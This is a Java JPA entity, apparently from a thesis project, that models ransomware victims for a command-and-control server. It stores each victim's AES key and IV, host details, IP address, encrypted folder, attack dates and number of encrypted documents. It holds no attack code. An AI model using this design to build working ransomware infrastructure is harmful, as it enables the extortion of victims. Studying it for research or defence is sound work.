package it.ssri.tesi.c2.model;

import jakarta.persistence.Column;
import jakarta.persistence.Entity;
import jakarta.persistence.GeneratedValue;
import jakarta.persistence.GenerationType;
import jakarta.persistence.Id;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

import java.time.Instant;

@Entity
@Data
@AllArgsConstructor
@NoArgsConstructor
@Builder
public class Victim {

    @Id
    @GeneratedValue(strategy = GenerationType.UUID)
    private String id;

    @Column(name = "aes_key")
    private String aesKey;

    @Column(name = "aes_iv")
    private String aesIv;

    private String os;

    @Column(name = "os_version")
    private String osVersion;

    @Column(name = "host_name")
    private String hostName;

    @Column(name = "ip_address")
    private String ipAddress;

    @Column(name = "encrypted_folder")
    private String encryptedFolder;

    @Column(name = "effective_encrypted_folder")
    private String effectiveEncryptedFolder;

    @Column(name = "start_attack_date")
    private Instant startAttackDate;

    @Column(name = "end_attack_date")
    private Instant endAttackDate;

    @Column(name = "tot_docs_encrypted")
    private Integer totDocsEncrypted;

    private String error;

}
